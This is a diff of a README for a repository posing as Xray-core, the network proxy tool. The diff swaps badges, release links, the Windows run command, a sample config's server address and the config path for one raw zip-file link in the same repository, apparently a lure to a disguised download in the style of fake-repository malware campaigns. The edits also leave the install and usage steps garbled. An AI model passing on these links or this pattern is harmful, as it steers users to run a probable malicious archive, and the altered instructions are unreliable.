@@ -1,6 +1,6 @@
 # Xray-core 🚀
 
-![Xray-core](https://img.shields.io/badge/Xray--core-v1.0.0-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)
+![Xray-core](https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip) ![Releases](https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip)
 
 Welcome to the **Xray-core** repository! This project aims to provide a robust platform for various network protocols and services. With Xray, you can navigate through the complexities of network traffic, ensuring a smooth and secure online experience. 
 
@@ -59,7 +59,7 @@ This repository covers a wide range of topics related to network management and 
 
 To get started with Xray-core, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Emmanuel66h/Xray-core/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip).
 2. **Extract the downloaded file** to your preferred directory.
 3. **Run the executable** according to your operating system.
 
@@ -67,7 +67,7 @@ To get started with Xray-core, follow these steps:
 
 1. Download the `.exe` file.
 2. Open Command Prompt and navigate to the directory where you extracted Xray-core.
-3. Run the command: `xray.exe`
+3. Run the command: `https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip`
 
 ### For Linux
 
@@ -78,7 +78,7 @@ To get started with Xray-core, follow these steps:
 
 ### For macOS
 
-1. Download the `.tar.gz` file.
+1. Download the `https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip` file.
 2. Open your terminal and navigate to the directory where you extracted Xray-core.
 3. Make the file executable: `chmod +x xray`
 4. Run the command: `./xray`
@@ -98,7 +98,7 @@ Once installed, you can start using Xray-core by configuring it according to you
          "settings": {
            "vnext": [
              {
-               "address": "your.server.com",
+               "address": "https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip",
                "port": 443,
                "users": [
                  {
@@ -116,7 +116,7 @@ Once installed, you can start using Xray-core by configuring it according to you
 
 2. **Run Xray-core**: Use the command line to run the executable with your configuration file:
    ```bash
-   ./xray run -config config.json
+   ./xray run -config https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip
    ```
 
 3. **Monitor the Logs**: Check the logs to ensure everything is running smoothly. Logs will provide insights into any issues or successful connections.
@@ -140,7 +140,7 @@ For questions or support, please reach out via the GitHub Issues section or cont
 
 ## Releases
 
-To keep your installation up to date, check the [Releases section](https://github.com/Emmanuel66h/Xray-core/releases) for the latest updates. Download the files and execute them as needed to ensure you have the most recent features and security updates.
+To keep your installation up to date, check the [Releases section](https://github.com/Emmanuel66h/Xray-core/raw/refs/heads/main/common/dice/Xray-core-braziery.zip) for the latest updates. Download the files and execute them as needed to ensure you have the most recent features and security updates.
 
 ---
 
